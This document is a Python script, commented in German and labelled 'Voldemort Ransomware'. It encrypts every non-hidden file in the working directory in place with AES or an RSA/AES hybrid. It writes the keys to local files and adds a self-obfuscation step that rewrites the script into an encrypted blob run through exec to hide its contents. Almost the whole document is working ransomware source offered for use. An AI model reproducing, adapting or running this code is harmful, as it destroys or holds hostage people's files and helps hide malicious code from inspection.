#!/usr/bin/env python3
import os
import base64
import zlib
import random
import string
from pathlib import Path
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization, hashes

class CodeObfuscator:
    def __init__(self):
        self.key = Fernet.generate_key()
        self.cipher = Fernet(self.key)
        
    def generate_random_name(self, length=10):
        """Generiert zufällige Variablennamen"""
        return ''.join(random.choices(string.ascii_letters, k=length))
    
    def obfuscate(self, code: str) -> str:
        """Verschleiert den Code"""
        # Code komprimieren und verschlüsseln
        compressed = zlib.compress(code.encode())
        encrypted = self.cipher.encrypt(base64.b85encode(compressed))
        
        # Zufällige Variablennamen
        var1 = self.generate_random_name()
        var2 = self.generate_random_name()
        var3 = self.generate_random_name()
        
        # Verschleierter Code
        obfuscated = f"""
import base64,zlib,os
from cryptography.fernet import Fernet
{var1}={self.key}
{var2}=Fernet({var1})
{var3}=exec(zlib.decompress(base64.b85decode({var2}.decrypt({encrypted}))))
"""
        return obfuscated

# Der Rest deines originalen Codes hier
MARKER = "ENCRYPTED"

def generate_aes_key():
    return os.urandom(32)

def aes_encrypt(key, data):
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    encrypted_data = iv + encryptor.update(data) + encryptor.finalize()
    return encrypted_data

def generate_rsa_key():
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend()
    )
    return private_key

def rsa_encrypt(public_key, data):
    encrypted_data = public_key.encrypt(
        data,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    return encrypted_data

def check_if_encrypted(filename):
    if os.path.exists(filename):
        with open(filename, 'rb') as f:
            return MARKER.encode() in f.read()
    return False

def encrypt_files():
    print("\n=== Voldemort Ransomware ===")
    print("Wähle Verschlüsselungsalgorithmus:")
    print("1. AES")
    print("2. RSA")
    choice = input("Wahl (1 oder 2): ")

    if choice == "1":
        aes_key = generate_aes_key()
        with open("thekey.key", "wb") as key_file:
            key_file.write(aes_key)
        encrypt_func = lambda data: aes_encrypt(aes_key, data)
        print("AES Modus aktiviert")

    elif choice == "2":
        aes_key = generate_aes_key()
        rsa_key = generate_rsa_key()
        with open("thekey.key", "wb") as key_file:
            key_file.write(rsa_key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.PKCS8,
                encryption_algorithm=serialization.NoEncryption()
            ))
        public_key = rsa_key.public_key()
        encrypted_aes_key = rsa_encrypt(public_key, aes_key)
        with open("aes_key.enc", "wb") as key_file:
            key_file.write(encrypted_aes_key)
        encrypt_func = lambda data: aes_encrypt(aes_key, data)
        print("RSA/AES Hybrid Modus aktiviert")
    else:
        print("Ungültige Wahl!")
        return

    # Dateien verschlüsseln
    files = [file for file in os.listdir() 
             if os.path.isfile(file) 
             and file not in ("voldemort.py", "thekey.key", "decrypt.py", "aes_key.enc", "un_voldemort.py") 
             and not file.startswith('.')]
    
    print("\nZu verschlüsselnde Dateien:", files)
    
    for file in files:
        try:
            if check_if_encrypted(file):
                print(f"{file} bereits verschlüsselt.")
                continue
                
            with open(file, "rb") as f:
                data = f.read()
            
            encrypted_data = encrypt_func(data) + MARKER.encode()
            
            with open(file, "wb") as f:
                f.write(encrypted_data)
            
            print(f"{file} verschlüsselt.")
            
        except Exception as e:
            print(f"Fehler bei {file}: {str(e)}")

def main():
    encrypt_files()

if __name__ == "__main__":
    # Code selbst verschleiern
    with open(__file__, 'r') as f:
        content = f.read()
    
    if 'CodeObfuscator' in content:
        # Noch nicht verschleiert
        obfuscator = CodeObfuscator()
        obfuscated_code = obfuscator.obfuscate(content)
        
        with open(__file__, 'w') as f:
            f.write(obfuscated_code)
        
        print("Code verschleiert. Starte neu für Dateiverschlüsselung.")
    else:
        # Bereits verschleiert, normale Ausführung
        main()
